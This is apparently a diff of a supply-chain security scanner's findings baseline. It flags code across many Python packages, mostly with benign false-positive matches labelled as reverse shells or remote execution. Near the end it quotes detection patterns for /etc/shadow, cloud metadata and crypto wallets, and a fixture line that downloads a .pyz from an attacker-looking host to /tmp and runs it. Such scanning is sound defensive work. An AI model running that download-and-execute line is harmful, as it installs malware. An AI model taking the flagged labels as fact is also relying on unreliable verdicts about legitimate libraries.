       "file": "pyperclip/__init__.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L488: decoded_bytes = base64.b64decode(base64_encoded)\nSubprocess: L80: return subprocess.call(['which', name], | L100: p = subprocess.Popen(['pbcopy', 'w'], | L105: p = subprocess.Popen(['pbpaste', 'r'],"
+      "evidence": "Base64: L488: decoded_bytes = base64.b64decode(base64_encoded)\nSubprocess: L80: return subprocess.call(['which', name], | L100: p = subprocess.Popen(['pbcopy', 'w'], | L105: p = subprocess.Popen(['pbpaste', 'r'],",
+      "evidence_hash": "d53b274e38657c7e9cab56ca77e7229327d3c101f714aeaa4989067afdc4fd28"
     },
     {
       "package": "pytest",
       "file": "_pytest/_py/path.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L1153: exec(f.read(), mod.__dict__)"
+      "evidence": "L1153: exec(f.read(), mod.__dict__)",
+      "evidence_hash": "cfae1da68a9485fc67eb044f40a40b15f3c061d638cc8c2b231f1c802a55a7e7"
     },
     {
       "package": "pytest",
       "file": "_pytest/capture.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L483: os.dup2(self.targetfd_invalid, targetfd) | L522: os.dup2(self.tmpfile.fileno(), self.targetfd) | L532: os.dup2(self.targetfd_save, self.targetfd)"
+      "evidence": "L483: os.dup2(self.targetfd_invalid, targetfd) | L522: os.dup2(self.tmpfile.fileno(), self.targetfd) | L532: os.dup2(self.targetfd_save, self.targetfd)",
+      "evidence_hash": "d5b08026c3ec8acd9fdcb51b0748555446050647af6a53f91db0c55e135cbe5f"
     },
     {
       "package": "pytest",
       "file": "_pytest/config/__init__.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L260: os.dup2(devnull, sys.stdout.fileno())"
+      "evidence": "L260: os.dup2(devnull, sys.stdout.fileno())",
+      "evidence_hash": "ad61fb11f982eb4a271a96f12023dd9982f95268a08f2cba3e3fbeeb9a7ab6e0"
     },
     {
       "package": "python-dateutil",
       "file": "dateutil/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L16: return importlib.import_module(\".\" + name, __name__)"
+      "evidence": "L16: return importlib.import_module(\".\" + name, __name__)",
+      "evidence_hash": "b330e340a3725dc9061341a54c561d7e51d718c24bb2e938deee514037b5bc97"
     },
     {
       "package": "rich",
       "file": "rich/ansi.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L229: pty.spawn(sys.argv[1:], read)"
+      "evidence": "L229: pty.spawn(sys.argv[1:], read)",
+      "evidence_hash": "ec2af573e225dd92e22fd59d9f89e2e6b7ee651f96739a1869bdb561561ce193"
     },
     {
       "package": "rich",
       "file": "rich/console.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L2041: os.dup2(devnull, sys.stdout.fileno())"
+      "evidence": "L2041: os.dup2(devnull, sys.stdout.fileno())",
+      "evidence_hash": "ad61fb11f982eb4a271a96f12023dd9982f95268a08f2cba3e3fbeeb9a7ab6e0"
     },
     {
       "package": "rich-rst",
       "file": "rich_rst/_vendor/docutils/readers/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L129: module = importlib.import_module('rich_rst._vendor.docutils.readers.'+name)"
+      "evidence": "L129: module = importlib.import_module('rich_rst._vendor.docutils.readers.'+name)",
+      "evidence_hash": "f526db9d48594ed9abd77e1e89390e267c8b895b8e578aa8c5aaec928d46f1c0"
     },
     {
       "package": "rich-rst",
       "file": "rich_rst/_vendor/docutils/writers/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L271: module = importlib.import_module('rich_rst._vendor.docutils.writers.'+name)"
+      "evidence": "L271: module = importlib.import_module('rich_rst._vendor.docutils.writers.'+name)",
+      "evidence_hash": "8bd0a8814171f2436148a75c6dff9d85cf8382402c5aab6024b6d5dbfd74565d"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/datasets/_openml.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L100: while True:"
+      "evidence": "L100: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/externals/array_api_compat/cupy/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L12: __import__(__package__ + '.linalg') | L13: __import__(__package__ + '.fft')"
+      "evidence": "L10: __import__(__package__ + '.linalg') | L11: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/externals/array_api_compat/dask/array/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L16: __import__(__package__ + '.linalg') | L17: __import__(__package__ + '.fft')"
+      "evidence": "L11: __import__(__package__ + '.linalg') | L12: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/externals/array_api_compat/numpy/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L23: __import__(__package__ + \".linalg\") | L25: __import__(__package__ + \".fft\")"
+      "evidence": "L22: __import__(__package__ + \".linalg\") | L24: __import__(__package__ + \".fft\")",
+      "evidence_hash": "2aeb92ab39b96835a6bb568e9ea0a9f8a823ae29a945bf2f814615695a0cea6d"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/externals/array_api_compat/torch/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L13: __import__(__package__ + '.linalg') | L14: __import__(__package__ + '.fft')"
+      "evidence": "L19: __import__(__package__ + '.linalg') | L20: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "scikit-learn",
       "file": "sklearn/svm/tests/test_svm.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L1040: os.dup2(os.pipe()[1], 1) | L1047: os.dup2(stdout, 1)"
+      "evidence": "L980: os.dup2(os.pipe()[1], 1) | L987: os.dup2(stdout, 1)",
+      "evidence_hash": "946bfb699dd243f0514ee393c0e99cc596604670913849cb4281fc2692c3d4f1"
     },
     {
       "package": "scipy",
-      "file": "scipy/_lib/array_api_compat/cupy/__init__.py",
+      "file": "scipy/_external/array_api_compat/cupy/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L12: __import__(__package__ + '.linalg') | L13: __import__(__package__ + '.fft')"
+      "evidence": "L12: __import__(__package__ + '.linalg') | L13: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "scipy",
-      "file": "scipy/_lib/array_api_compat/dask/array/__init__.py",
+      "file": "scipy/_external/array_api_compat/dask/array/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L16: __import__(__package__ + '.linalg') | L17: __import__(__package__ + '.fft')"
+      "evidence": "L16: __import__(__package__ + '.linalg') | L17: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "scipy",
-      "file": "scipy/_lib/array_api_compat/numpy/__init__.py",
+      "file": "scipy/_external/array_api_compat/numpy/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L23: __import__(__package__ + \".linalg\") | L25: __import__(__package__ + \".fft\")"
+      "evidence": "L23: __import__(__package__ + \".linalg\") | L25: __import__(__package__ + \".fft\")",
+      "evidence_hash": "2aeb92ab39b96835a6bb568e9ea0a9f8a823ae29a945bf2f814615695a0cea6d"
     },
     {
       "package": "scipy",
-      "file": "scipy/_lib/array_api_compat/torch/__init__.py",
+      "file": "scipy/_external/array_api_compat/torch/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L13: __import__(__package__ + '.linalg') | L14: __import__(__package__ + '.fft')"
+      "evidence": "L13: __import__(__package__ + '.linalg') | L14: __import__(__package__ + '.fft')",
+      "evidence_hash": "ad135ff6172d28af16453145862e328dd71d68b893b93a134deddf75b7b187e9"
     },
     {
       "package": "sentencepiece",
       "file": "sentencepiece/__init__.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L1221: os.dup2(self.ostream.fileno(), self.orig_stream_fileno) | L1226: os.dup2(self.orig_stream_dup, self.orig_stream_fileno)"
+      "evidence": "L1221: os.dup2(self.ostream.fileno(), self.orig_stream_fileno) | L1226: os.dup2(self.orig_stream_dup, self.orig_stream_fileno)",
+      "evidence_hash": "abd9c74861fd58df673d519d6c0e11d0087392cc8e3914933fb30931da0b51ee"
     },
     {
       "package": "setuptools",
       "file": "distutils-precedence.pth",
       "check": ".pth has advanced obfuscation (marshal/compile/zlib/__import__)",
       "severity": "CRITICAL",
-      "evidence": "L1: import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();"
+      "evidence": "L1: import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();",
+      "evidence_hash": "2f70c2fa9227e9db9348215d9c7b246d2786aac7516f86d71a5952c7c225aa16"
     },
     {
       "package": "setuptools",
       "file": "setuptools/_distutils/tests/test_build_ext.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L115: shutil.copyfile(libz_so[-1], '/tmp/libxx_z.so')"
+      "evidence": "L115: shutil.copyfile(libz_so[-1], '/tmp/libxx_z.so')",
+      "evidence_hash": "65865f95b3e7789c1fe678399b0edffc340d7224720f62dccfaf8c77adfbc997"
     },
     {
       "package": "setuptools",
       "file": "setuptools/_vendor/jaraco/context/__init__.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L79: with tarfile.open(fileobj=req, mode='r|*') as tf:\nNetwork: L14: import urllib.request | L78: req = urllib.request.urlopen(url)"
+      "evidence": "Archive: L79: with tarfile.open(fileobj=req, mode='r|*') as tf:\nNetwork: L14: import urllib.request | L78: req = urllib.request.urlopen(url)",
+      "evidence_hash": "2f9a20daf730cbf95be1d413149fda26b3a4e5799784065e86e4ae85d1997559"
     },
     {
       "package": "sympy",
       "file": "sympy/external/importtools.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L154: __import__(module + '.' + submod)"
+      "evidence": "L154: __import__(module + '.' + submod)",
+      "evidence_hash": "8079980295af2d751a700280d6bc5ae983dfc1afd1c07865778ca2ea54365b4f"
     },
     {
       "package": "tiktoken",
       "file": "tiktoken/load.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L38: cache_dir = os.environ[\"TIKTOKEN_CACHE_DIR\"]\nNetwork: L17: resp = requests.get(blobpath)"
+      "evidence": "Env: L38: cache_dir = os.environ[\"TIKTOKEN_CACHE_DIR\"]\nNetwork: L17: resp = requests.get(blobpath)",
+      "evidence_hash": "18c92c0c1fce685958a1d44e0cf80d5844bbd0c58e5359fec7bc3dc8d4ef841c"
     },
     {
       "package": "torch",
       "file": "functorch/dim/magic_trace.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L15: output: str = \"trace.fxt\", magic_trace_cache: str = \"/tmp/magic-trace\""
+      "evidence": "L15: output: str = \"trace.fxt\", magic_trace_cache: str = \"/tmp/magic-trace\"",
+      "evidence_hash": "ebea160828b1f8961698f9f05c37e525ef8d088017a3ae10ab90a0ed69d0dfac"
     },
     {
       "package": "torch",
       "file": "torch/_inductor/codecache.py",
       "check": "base64 decode + subprocess execution (staged payload)",
       "severity": "CRITICAL",
-      "evidence": "Base64: L1211: content = base64.b64decode(data)\nSubprocess: L2692: subprocess.run( | L2995: cmd_output = subprocess.run( | L3707: out = subprocess.check_output("
+      "evidence": "Base64: L1211: content = base64.b64decode(data)\nSubprocess: L2692: subprocess.run( | L2995: cmd_output = subprocess.run( | L3707: out = subprocess.check_output(",
+      "evidence_hash": "779c25027b501dbbe4b6940bf8a75f7a79b307db8af71e8501ec0f37af8633ee"
     },
     {
       "package": "torch",
       "file": "torch/ao/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L30: return importlib.import_module(\".\" + name, __name__)"
+      "evidence": "L30: return importlib.import_module(\".\" + name, __name__)",
+      "evidence_hash": "b330e340a3725dc9061341a54c561d7e51d718c24bb2e938deee514037b5bc97"
     },
     {
       "package": "torch",
       "file": "torch/ao/nn/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L34: return importlib.import_module(\".\" + name, __name__)"
+      "evidence": "L34: return importlib.import_module(\".\" + name, __name__)",
+      "evidence_hash": "b330e340a3725dc9061341a54c561d7e51d718c24bb2e938deee514037b5bc97"
     },
     {
       "package": "torch",
       "file": "torch/ao/nn/intrinsic/__init__.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L40: return importlib.import_module(\".\" + name, __name__)"
+      "evidence": "L40: return importlib.import_module(\".\" + name, __name__)",
+      "evidence_hash": "b330e340a3725dc9061341a54c561d7e51d718c24bb2e938deee514037b5bc97"
     },
     {
       "package": "torch",
       "file": "torch/cuda/_memory_viz.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L74: if \"history\" in b:\nNetwork: L97: import urllib.request | L101: urllib.request.urlretrieve("
+      "evidence": "FS: L74: if \"history\" in b:\nNetwork: L97: import urllib.request | L101: urllib.request.urlretrieve(",
+      "evidence_hash": "1976aeb8f6e36ac8e4802639238811e02e45d95a91b8081522b9b24266be4118"
     },
     {
       "package": "torch",
       "file": "torch/distributed/elastic/multiprocessing/redirects.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L218: os.dup2(dst.fileno(), std_fd)"
+      "evidence": "L218: os.dup2(dst.fileno(), std_fd)",
+      "evidence_hash": "168d2355efd9084d8ca2c5cccb2840053a0f469ea06d2e3b6c4e11a8523d65eb"
     },
     {
       "package": "torch",
       "file": "torch/hub.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L237: token = os.environ.get(ENV_GITHUB_TOKEN)\nNetwork: L19: from urllib.request import Request, urlopen | L206: with urlopen(f\"https://github.com/{repo_owner}/{repo_name}/tree/main/\"): | L230: with urlopen(url) as r:"
+      "evidence": "Env: L237: token = os.environ.get(ENV_GITHUB_TOKEN)\nNetwork: L19: from urllib.request import Request, urlopen | L206: with urlopen(f\"https://github.com/{repo_owner}/{repo_name}/tree/main/\"): | L230: with urlopen(url) as r:",
+      "evidence_hash": "0c37dfe47939c8ffb17fd63b85b7b7e83bfebafa5b2bc872f3c4400b3ffb9782"
     },
     {
       "package": "torch",
       "file": "torch/testing/_internal/common_utils.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L4770: env = os.environ.copy()\nNetwork: L4832: with request.urlopen(url, timeout=15) as f1, open(path, 'wb' if binary else 'w') as f2: | L4850: with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:"
+      "evidence": "Env: L4770: env = os.environ.copy()\nNetwork: L4832: with request.urlopen(url, timeout=15) as f1, open(path, 'wb' if binary else 'w') as f2: | L4850: with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:",
+      "evidence_hash": "0f712b089c10e087fa8658d6da98da86ca04b033290b2d40292f95de4d282d3c"
     },
     {
       "package": "torch",
       "file": "torch/testing/_internal/common_utils.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L32: import socket"
+      "evidence": "L32: import socket",
+      "evidence_hash": "7773c884b8cd524d37b6b377f43cb5f05899db17d58442afb8508841ccc88991"
     },
     {
       "package": "torchvision",
       "file": "torchvision/datasets/utils.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L212: with tarfile.open(from_path, f\"r:{compression[1:]}\" if compression else \"r\") as tar:\nNetwork: L12: import urllib.request | L28: with urllib.request.urlopen(urllib.request.Request(url, headers={\"User-Agent\": USER_AGENT})) as r"
+      "evidence": "Archive: L212: with tarfile.open(from_path, f\"r:{compression[1:]}\" if compression else \"r\") as tar:\nNetwork: L12: import urllib.request | L28: with urllib.request.urlopen(urllib.request.Request(url, headers={\"User-Agent\": USER_AGENT})) as response: | L63: with urllib.request.urlopen(urllib.request.Request(url, headers=headers)) as response:",
+      "evidence_hash": "a15894577409dbcfadcbb0a04b4a1944f7cdc00246cd1cdb6b4390743a4d4c1f"
     },
     {
       "package": "traitlets",
       "file": "traitlets/config/loader.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L82: exec(compile(f.read(), fname, \"exec\"), glob, glob) | L655: exec(compile(f.read(), conf_filename, \"exec\"), namespace, namespace)"
+      "evidence": "L82: exec(compile(f.read(), fname, \"exec\"), glob, glob) | L655: exec(compile(f.read(), conf_filename, \"exec\"), namespace, namespace)",
+      "evidence_hash": "eaa16d9f17bfa70097dd450eb42ecf1d6467eca9eb9b6afbed72f5b9355fb7e3"
     },
     {
       "package": "transformers",
       "file": "transformers/integrations/integration_utils.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L2057: \"Syncing log history requires both flytekitplugins-deck-standard and pandas to be installed. \"\nNetwork: L2462: import urllib.request | L2493: req = urllib.request.Request(url, data=data, headers=headers, method=\"POST\") | L2494: w"
+      "evidence": "FS: L2125: \"Syncing log history requires both flytekitplugins-deck-standard and pandas to be installed. \"\nNetwork: L2530: import urllib.request | L2561: req = urllib.request.Request(url, data=data, headers=headers, method=\"POST\") | L2562: with urllib.request.urlopen(req, timeout=5, context=self._get_ssl_context()) as resp:",
+      "evidence_hash": "0db5df7c625dcf5a6f90509c485887f32112c58f1aba0dfa863c6e488680ee03"
     },
     {
       "package": "transformers",
       "file": "transformers/integrations/integration_utils.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L2444: token_path = os.environ.get(self._ENV_TOKEN_PATH)\nNetwork: L2462: import urllib.request | L2493: req = urllib.request.Request(url, data=data, headers=headers, method=\"POST\") | L2494: with urllib.request.urlopen(req, timeout=5, c"
+      "evidence": "Env: L2512: token_path = os.environ.get(self._ENV_TOKEN_PATH)\nNetwork: L2530: import urllib.request | L2561: req = urllib.request.Request(url, data=data, headers=headers, method=\"POST\") | L2562: with urllib.request.urlopen(req, timeout=5, context=self._get_ssl_context()) as resp:",
+      "evidence_hash": "246cabef1d2ae3c8cf252f5c14bf82041d634cd975393311d75fbe79a80c5ec1"
     },
     {
       "package": "transformers",
       "file": "transformers/testing_utils.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L1577: while True:"
+      "evidence": "L1663: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "transformers",
       "file": "transformers/testing_utils.py",
       "check": "Harvests environment variables/secrets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Env: L252: value = os.environ[key] | L268: value = os.environ[key] | L2043: env = os.environ.copy()\nNetwork: L2475: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:"
+      "evidence": "Env: L284: value = os.environ[key] | L300: value = os.environ[key] | L2129: env = os.environ.copy()\nNetwork: L2561: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
+      "evidence_hash": "6172bd5578851a884789021130a8b9c28490185a8d545d221488055f564f505f"
     },
     {
       "package": "transformers",
       "file": "transformers/testing_utils.py",
       "check": "Reverse shell / bind shell pattern",
       "severity": "CRITICAL",
-      "evidence": "L2473: import socket"
+      "evidence": "L2473: import socket",
+      "evidence_hash": "7773c884b8cd524d37b6b377f43cb5f05899db17d58442afb8508841ccc88991"
     },
     {
       "package": "transformers",
       "file": "transformers/utils/import_utils.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L2439: return importlib.import_module(\".\" + module_name, self.__name__)"
+      "evidence": "L2494: return importlib.import_module(\".\" + module_name, self.__name__)",
+      "evidence_hash": "1d92aa93af6b6efe769f236008d26f7de2f8978e467dbad19de6453dde58c250"
     },
     {
       "package": "triton",
       "file": "triton/tools/build_extern.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L315: self._ll_file = \"/tmp/extern_lib.ll\""
+      "evidence": "L315: self._ll_file = \"/tmp/extern_lib.ll\"",
+      "evidence_hash": "086b0cf9b352e455d810517f33667e629717c76a496deb094b155a0156b14361"
     },
     {
       "package": "trl",
       "file": "trl/extras/vllm_client.py",
       "check": "C2 polling/beaconing loop detected",
       "severity": "CRITICAL",
-      "evidence": "L152: while True:"
+      "evidence": "L146: while True:",
+      "evidence_hash": "6b450cdd8a41e5dd34ed7dd20f66eedea5396a7cb252b0e571ff2d24887bd6b9"
     },
     {
       "package": "trl",
       "file": "trl/import_utils.py",
       "check": "Downloads and executes remote code",
       "severity": "CRITICAL",
-      "evidence": "L156: return importlib.import_module(\".\" + module_name, self.__name__)"
+      "evidence": "L144: return importlib.import_module(\".\" + module_name, self.__name__)",
+      "evidence_hash": "1d92aa93af6b6efe769f236008d26f7de2f8978e467dbad19de6453dde58c250"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Accesses cloud metadata/IMDS AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "IMDS: L155: r\"|/latest/meta-data\" | L156: r\"|/metadata/instance\" | L157: r\"|/metadata/identity\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.re"
+      "evidence": "IMDS: L155: r\"|/latest/meta-data\" | L156: r\"|/metadata/instance\" | L157: r\"|/metadata/identity\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as resp:",
+      "evidence_hash": "909d7dd4dd326975ec62e185ed481b8d95c06e0db8ce9dc572ad111e6a5d3773"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L1254: with tarfile.open(path, mode = \"r|*\") as tf:\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as"
+      "evidence": "Archive: L1254: with tarfile.open(path, mode = \"r|*\") as tf:\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as resp:",
+      "evidence_hash": "145654b3e7838f7739dbe34ff0287fdabb044e2bdd84c50d8b8a2b0c67ce7f43"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Enumerates filesystem AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "FS: L116: r\"|/etc/shadow|/etc/passwd\" | L256: r\"|/etc/shadow\" | L257: r\"|/etc/passwd\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.url"
+      "evidence": "FS: L116: r\"|/etc/shadow|/etc/passwd\" | L256: r\"|/etc/shadow\" | L257: r\"|/etc/passwd\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as resp:",
+      "evidence_hash": "bf4eeacc9fa68a6e070fa466a3e072c2bc5bad0bf4ccff9e0e3dd212a347910f"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Installs persistence AND makes network calls (backdoor pattern)",
       "severity": "CRITICAL",
-      "evidence": "Persist: L163: r\"/etc/systemd/\" | L166: r\"|/etc/cron\" | L169: r\"|/Library/LaunchDaemons\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.u"
+      "evidence": "Persist: L163: r\"/etc/systemd/\" | L166: r\"|/etc/cron\" | L169: r\"|/Library/LaunchDaemons\"\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as resp:",
+      "evidence_hash": "7824277b418c1df080bbef803db3e5f737fad7022833931af0e4d94d84a7c2d3"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
-      "evidence": "L353: r\"|With Love TeamPCP|We've been online over 2 hours)\","
+      "evidence": "L353: r\"|With Love TeamPCP|We've been online over 2 hours)\",",
+      "evidence_hash": "442515041c1713dd6bd7452536351cd28f4815fd37251cee32ac243d1050679b"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Targets cryptocurrency wallets AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Crypto: L294: r\"|\\b(?:xprv|xpub|bc1|0x[a-fA-F0-9]{40})\\b\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as r"
+      "evidence": "Crypto: L294: r\"|\\b(?:xprv|xpub|bc1|0x[a-fA-F0-9]{40})\\b\",\nNetwork: L53: import urllib.request | L1757: req = urllib.request.Request(url, headers = {\"Accept\": \"application/json\"}) | L1758: with urllib.request.urlopen(req, timeout = 30) as resp:",
+      "evidence_hash": "528495e77906fde92d26a7acc7b26f8874a6643b6e3cf34e8a605cbca30d5a90"
     },
     {
       "package": "unsloth-zoo",
       "file": "scripts/scan_packages.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L308: r\"/tmp/\\S+.*(?:subprocess|os\\.system|os\\.popen|Popen|chmod.*\\+x)\","
+      "evidence": "L308: r\"/tmp/\\S+.*(?:subprocess|os\\.system|os\\.popen|Popen|chmod.*\\+x)\",",
+      "evidence_hash": "4c1c897f88cb97e69ce57e133d110dfdd25fd145bc48cf1d203a344459531db8"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "Creates archive with sensitive data AND makes network calls",
       "severity": "CRITICAL",
-      "evidence": "Archive: L129: with tarfile.open(fileobj = inner, mode = \"w\") as tf:\nNetwork: L48: import urllib.request | L52: urllib.request.urlretrieve("
+      "evidence": "Archive: L129: with tarfile.open(fileobj = inner, mode = \"w\") as tf:\nNetwork: L48: import urllib.request | L52: urllib.request.urlretrieve(",
+      "evidence_hash": "30df925a1190d825cd5b7cb573d6fd86fa5c382aa94c0e0075c9bc71b9c6b2bc"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
-      "evidence": "L53: \"https://git-tanstack.com/transformers.pyz\", | L54: \"/tmp/transformers.pyz\", | L56: subprocess.run([\"python3\", \"/tmp/transformers.pyz\"], check=False)"
+      "evidence": "L53: \"https://git-tanstack.com/transformers.pyz\", | L54: \"/tmp/transformers.pyz\", | L56: subprocess.run([\"python3\", \"/tmp/transformers.pyz\"], check=False)",
+      "evidence_hash": "7191b8e1f4caae265f8a56c16d60b8fc94e5b1b669eff1dfebbff20f77b92e80"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/security/fixtures/_build.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L54: \"/tmp/transformers.pyz\","
+      "evidence": "L54: \"/tmp/transformers.pyz\",",
+      "evidence_hash": "b9c4ba436828f24516d8f3e46fd00d9de6eafd209ca9c47ee48362821324ad74"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/security/test_scan_packages.py",
       "check": "May-12 Shai-Hulud IOC string present in Python file",
       "severity": "CRITICAL",
-      "evidence": "L154: \"git-tanstack.com\", | L155: \"/tmp/transformers.pyz\", | L156: \"transformers.pyz\","
+      "evidence": "L154: \"git-tanstack.com\", | L155: \"/tmp/transformers.pyz\", | L156: \"transformers.pyz\",",
+      "evidence_hash": "c6e46160113ff8ffaa1400ab99b71410e0903ea69bda5ef91179acd209014813"
     },
     {
       "package": "unsloth-zoo",
       "file": "tests/security/test_scan_packages.py",
       "check": "Writes to /tmp and executes (staged dropper)",
       "severity": "CRITICAL",
-      "evidence": "L155: \"/tmp/transformers.pyz\","
+      "evidence": "L155: \"/tmp/transformers.pyz\",",
